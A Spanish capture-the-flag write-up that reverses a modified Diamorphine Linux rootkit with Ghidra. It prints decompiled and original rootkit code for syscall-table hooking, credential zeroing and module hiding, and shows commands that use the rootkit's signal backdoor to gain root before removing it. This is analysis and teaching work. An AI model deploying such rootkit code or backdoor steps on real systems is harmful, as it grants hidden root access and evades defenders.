+++
title = "HackTheBox - Cyberpsychosis"
draft = false
description = "Resolución del challenge Cyberpsychosis"
tags = ["HTB", "ELF", "Rootkit", "Ghidra", "Reversing", "Easy"]
summary = "OS: Linux | Dificultad: Easy | Conceptos: Rootkit (diamorphine), Reversing, Ghidra"
categories = ["Writeups"]
showToc = true
date = "2026-03-14T00:00:00"
showRelated = true
+++

**CHALLENGE DESCRIPTION**

> _Malicious actors have infiltrated our systems and we believe they've implanted a custom rootkit. Can you disarm the rootkit and find the hidden data?_

Archivos iniciales:

* `diamorphine.ko`

## Análisis inicial
Al ejecutar `file` sobre el archivo, vemos lo siguiente:
```bash
$ file diamorphine.ko 
diamorphine.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=e6a635e5bd8219ae93d2bc26574fff42dc4e1105, with debug_info, not stripped
```
 - `ELF 64-bit` Se trata de un objeto binario / ejecutable
 - `with debug_info, not stripped`: Si ejecutamos strings o lo abrimos con ghidra, es probable que tengamos más facilidad para identificar qué hace cada función o variable.

 Al principio, no sé qué es un `.ko`. así que busco en Internet y encuentro [esto](https://www.linkedin.com/pulse/dissecting-linux-kernel-object-ko-file-structure-sections-david-zhu-srlec/):

> *A .ko file (Kernel Object) is a loadable kernel module in Linux, encapsulating code and data that can be dynamically inserted into or removed from the running kernel.*

Se trata de un módulo del kernel de Linux, diseñado para cargarse dinámicamente. Tiene varias secciones:
- `.text`: Instrucciones en assembly
- `.rodata`: Datos de solo lectura
- `.data`: Variables inicializadas
- `.bss`: Variables sin inicializar
- `.init.text`: Código que se ejecuta una sola vez al iniciar el módulo
- `.exit.text`: Código que se ejecuta al parar el módulo
- `.modinfo`: Metadatos del autor, licencia, etc.
- `...`

Antes de intentar descompilarlo, buscamos más información sobre el nombre del archivo, vemos que diamorfina es otro nombre para la [heroína](https://es.wikipedia.org/wiki/Hero%C3%ADna) y, además, es el nombre de [un rootkit de Linux real](https://github.com/m0nad/Diamorphine). Según la página de GitHub del rootkit, hace lo siguiente:
- When loaded, the module starts invisible;
- Hide/unhide any process by sending a signal 31;
- Sending a signal 63(to any pid) makes the module become (in)visible;
- Sending a signal 64(to any pid) makes the given user become root;
- Files or directories starting with the MAGIC_PREFIX become invisible;

Así que, por defecto, varias de las funciones que encontremos harán cosas como:
- Ocultar el binario al ejecutarlo
- Mostrar y ocultar procesos al recibir señal `31`
- Mostrar y ocultar usuarios al recibir señal `63`
- Hacer root a un usuario al recibir señal `64`
- Filtrar archivos si su nombre empieza por el MAGIC_PREFIX

Según veo, este rootkit no es tanto uno como los que suelen instalarse cuando un dispositivo es infectado por malware, sino uno que por ejemplo podría usar un pentester para conseguir persistencia, permitiendo conseguir privilegios y ocultarse de un blue team fácilmente. Además, el nombre `diamorphine` (y el del propio challenge: `Cyberpsychosis`) parece ser simbólico y relacionado con la droga directamente: Se inyecta en el kernel (o en vena directamente), oculta procesos y manipula syscalls (hace de analgésico) y permite conseguir root instantáneamente (tiene efecto casi inmediato).

## Descompilando
Por motivos obvios, no vamos a ejecutar el rootkit localmente, aunque técnicamente podemos desinstalarlo fácilmente e incluso en el repositorio se incluye una guía para ello. Lo descompilaremos con Ghidra, aunque, teniendo el código fuente disponible, sería una oportunidad desaprovechada no ir comparándolo con el pseudocódigo de Ghidra 1 a 1.

Según vayamos descompilando funciones iremos mirando si se ha modificado algo del rootkit o si todo queda igual, para ver si el flag está hardcodeado el algún sitio o hay algo relevante. Si todo queda igual, simplemente desactivaremos el rootkit del servidor y buscaremos el flag.

### `diamorphine_init()` y `diamorphine_cleanup()` -> Funcionamiento del rootkit
Esta es la función principal que se ejecuta cuando se conecta el módulo al kernel del sistema. Ghidra nos da lo siguiente (de forma simplificada):
```C
int diamorphine_init(void){
  ulong *puVar1;
  int iVar2;
  ulong __force_order;
  
  __sys_call_table = get_syscall_table_bf(); //Se guarda la tabla de syscalls en __sys_call_table
  iVar2 = -1;
  if (__sys_call_table != (ulong *)0x0) { //Si se ha guardado bien la tabla de syscalls, se hace lo siguiente:
    cr0 = commit_creds();
    module_hide();
    kfree(__this_module.sect_attrs);
    puVar1 = __sys_call_table;
    __this_module.sect_attrs = (module_sect_attrs *)0x0;
    orig_getdents = (t_syscall)__sys_call_table[0x4e];
    orig_getdents64 = (t_syscall)__sys_call_table[0xd9];
    orig_kill = (t_syscall)__sys_call_table[0x3e];
    __sys_call_table[0x4e] = (ulong)hacked_getdents;
    puVar1[0xd9] = (ulong)hacked_getdents64;
    puVar1[0x3e] = (ulong)hacked_kill;
    iVar2 = 0;
  }
  return iVar2;
}
```
En el kernel la `sys_call_table` es simplemente un array gigante de punteros a subrutinas, y cada syscall específica tiene un índice asignado. En [este archivo del kernel de Linux](https://github.com/OpenChannelSSD/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) se puede ver que:
- `sys_kill` (Matar un proceso) tiene el 62 (`0x3e`)
- `sys_getdents` (Mostrar contenidos de un directorio) tiene el 78 (`0x4e`)
- `sys_getdents64` (Como el anterior, pero para 64bit) tiene el 217 (`0xd9`)

Entonces lo que se hace es lo siguiente (con algunas funciones copiadas del código fuente original porque Ghidra las había detectado erróneamente):
```C
int diamorphine_init(void){
    syscall_table = get_syscall_table_bf();
    
    if (syscall_table != 0x0) {
        
        cr0 = read_cr0(); //Se lee el registro cr0 de x86 para desactivar protecciones
        module_hide(); // Se oculta el módulo
        tidy(); //En el código original se usa tidy(), en Ghidra veíamos que se liberaba la memoria donde estaban los atributos del propio módulo del kernel, posiblemente para esconderlo todavía más
        
        // Guardar copia de las syscalls a modificar originales
        orig_getdents = (t_syscall)syscall_table[0x4e];
        orig_getdents64 = (t_syscall)syscall_table[0xd9];
        orig_kill = (t_syscall)syscall_table[0x3e];
        
        // Modificar syscall_table original con syscall_table maliciosa
        syscall_table[0x4e] = (ulong)hacked_getdents;
        syscall_table[0xd9] = (ulong)hacked_getdents64;
        syscall_table[0x3e] = (ulong)hacked_kill;
        
        return 0;
    }
    else return -1;
}
```

Con `diamorphine_cleanup()` vemos que se hace la operación contraria:
```c
void diamorphine_cleanup(void){
    ulong *syscall_table;
    
    // Restablecer syscalls originales.
    syscall_table[0x4e] = (ulong)orig_getdents;
    syscall_table[0xd9] = (ulong)orig_getdents64;
    syscall_table[0x3e] = (ulong)orig_kill;
}
```

Ambas funciones son iguales al código fuente, así que no hay nada interesante.
### `find_task()` -> Nada relevante
Ghidra nos devuelve lo siguiente:

```C
task_struct * find_task(pid_t pid){
    undefined1 *nextPTR;
    undefined1 *process_ptr;
    process_ptr = &init_task;
    
    do {
        nextPTR = *(undefined1 **)(process_ptr + 0x8b8);
        process_ptr = nextPTR + -0x8b8;
        if (nextPTR == &DAT_001028f0) return (task_struct *)0x0;
    } while (*(int *)(nextPTR + 0x108) != pid);
    
    return (task_struct *)process_ptr;
}

```
Mientras que el código en C original se entiende mucho mejor:
```C
struct task_struct* find_task(pid_t pid){
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}
```
El sistema lee todos los procesos (`for_each_process(p)`), y , cuando encuentra uno con el PID especificado, devuelve todo su struct entero (toda su info). Si no encuentra uno, devuelve NULL. La diferencia entre el código en C y el de Ghidra es que, como `for_each_process()` es un macro del sistema y Ghidra solo entiende la lógica del programa, lo que nos muestra es el macro "deshecho". Los procesos en Linux se guardan como una [linked-list circular](https://linuxvox.com/blog/why-does-the-linux-kernel-use-circular-doubly-linked-lists-to-store-the-lists-of-processes/), así que hay que llevar la cuenta de cuál es el primer elemento que se ha comprobado para no repetir la vuelta, por eso Ghidra muestra esto:

Se guarda en `process_ptr` el struct del proceso `init` (el primero que se ejecuta al arrancar el sistema), y se hace lo siguiente mientras no se encuente el PID buscado:
- Se guarda el puntero al siguiente proceso en `nextPTR` (ubicado a mitad del struct, por eso se usa base+offset)
- Se va al siguiente elemento y se guarda el puntero a su struct en `process_ptr`
- Se compara su PID (ubicado en `Dir.Base_Struct + 0x108`) con el buscado.
- Si no es, se vuelve al inicio del ciclo. Si se encuentra, se devuelve su struct
- Si se llega al elemento inicial (init) de nuevo (`nextPTR == &DAT_001028f0`, dato hardcodeado que apunta a la cabeza de la linked-list), se devuelve NULL

Esta función es exactamente igual, así que no hay nada que podamos encontrar interesante.
### `give_root()` -> Nada relevante
```C
void give_root(void){
  long lVar1 = prepare_creds();
  if (lVar1 != 0) {
    *(undefined8 *)(lVar1 + 4) = 0;
    *(undefined8 *)(lVar1 + 0xc) = 0;
    *(undefined8 *)(lVar1 + 0x14) = 0;
    *(undefined8 *)(lVar1 + 0x1c) = 0;
    commit_creds(lVar1);
  }
  return;
}
```
Esta subrutina corresponde a la funcionalidad de hacer root al usuario, así que en algún otro lado habrá una comprobación en la que se mira si un usuario manda una señal 64 a algún PID, ejecutando esta función si es así.

Vemos que usa `prepare_creds()` para guardar un struct de credenciales (`struct cred`, aunque Ghidra lo detecta como Long), luego cambia todos los UID/RID a 0 (para hacer root al usuario), y finalmente hace `commit_creds()` para guardar los cambios. No hay nada más, así que no es la función que buscamos.

### `hacked_kill()` -> Señal custom
Esta es una de las syscalls cuya dirección de salto el rootkit ha modificado para que se ejecuten instrucciones diferentes. En el código original vemos que se trata de dos funciones, y se usa una u otra en función de la versión del kernel. 
```C
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long hacked_kill(const struct pt_regs *pt_regs){
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage long
hacked_kill(pid_t pid, int sig){
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid, sig);
#endif
	}
	return 0;
}
```

Gracias a que tienen headers diferentes, podemos ver que la que se nos muestra en Ghidra es `int hacked_kill(pt_regs *pt_regs)`, es decir, la primera, así que nos quedamos con esa:
```C
asmlinkage long hacked_kill(const struct pt_regs *pt_regs){
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;
	  struct task_struct *task;
		switch (sig) {
		    case SIGINVIS:
						if ((task = find_task(pid)) == NULL) return -ESRCH;
						task->flags ^= PF_INVISIBLE;
						break;
				case SIGSUPER:
				    give_root();
						break;
				case SIGMODINVIS:
				    if (module_hidden) module_show();
						else module_hide();
						break;
				default:
				    return orig_kill(pt_regs);
		}
		return 0;
}
```

Si miramos la función `hacked_kill()` de Ghidra, vemos que hace exactamente lo mismo y no hay datos escondidos por ahí, aunque hay algo relevante: ***la señal usada para mostrar/ocultar el módulo del kernel no es la que venía por defecto (63), sino que es la 46.***
```c
int hacked_kill(pt_regs *pt_regs){
  ...[SNIP]...
  if (sig == 46) {
      // Esconder/Mostrar módulo del kernel
      // No es la señal default
  }
  else if (sig == 64) {
      // Hacer root al usuario
    }
  }
  else {
      ...[SNIP]...
    if (sig == 31) {
        // Mostrar u ocultar proceso
  }
  return sig;
}
```
En

### `hacked_getdents()` -> Magic Prefix Custom
Sabemos que el rootkit hacía dos cosas en esta función:
- Si se lista `/proc`, se ocultan los procesos marcados como invisibles
- Si no, se ocultan elementos (archivos/directorios) que empiecen por `MAGIC_PREFIX`

Pero cuál es el `MAGIC_PREFIX`? Si buscamos en Ghidra:
```c
...[SNIP]...
memmove(__dest,(void *)((long)__dest + (ulong)*(ushort *)((long)__dest + 0x10)),__n);
}
else {
if ((*(long *)((long)pvVar1 + 0x12) == 0x69736f6863797370) &&
   (*(char *)((long)pvVar1 + 0x1a) == 's')) {
  if (pvVar1 == __dest) goto LAB_00100245;
LAB_0010020a:
  *(short *)((long)pvVar11 + 0x10) =
       *(short *)((long)pvVar11 + 0x10) + *(short *)((long)pvVar1 + 0x10);
  pvVar12 = pvVar11;
}
```

Aquí vemos una serie de datos (recordemos que en Little-Endian): `0x69736f6863797370` y `'s'`. Esto, pasado a ASCII, es:
- `s` + `isohcysp` = `psychosis`

## Conexión al servidor
Así que sabemos que el rootkit, cuando está activo, oculta todos los archivos que empiecen por `psychosis`. Además, sabemos cómo desactivarlo, pues con la señal `46` se muestra/oculta el malware:
```bash
#The module starts invisible, to remove you need to make it visible
kill -63 0 # En nuestro caso el 46

#Then remove the module(as root)
rmmod diamorphine
```

Para ello, primero tendremos que hacernos root, usando la propia funcionalidad del rootkit:
```bash
~$ id
uid=1000 gid=1000 groups=1000

~$ kill -64 8888
~# whoami
root

```

Ahora hacemos visible el módulo usando la señal custom y lo desactivamos
```bash
~# find / -iname "psychosis*" 2>/dev/null # Vemos que no se encuentra nada
~# kill -46 9999
~# rmmod diamorphine
```

Finalmente buscamos archivos que empiecen por `psychosis`:
```bash
~# find / -iname "psychosis*" 2>/dev/null
/opt/psychosis

~# cd /opt/psychosis && ls
total 304
-rw-r--r--    1 root     root        306912 Sep  7  2023 diamorphine.ko
-rw-r--r--    1 root     root            73 Sep  7  2023 flag.txt

~# cat flag.txt
HTB{...}
```
Y tenemos el flag.
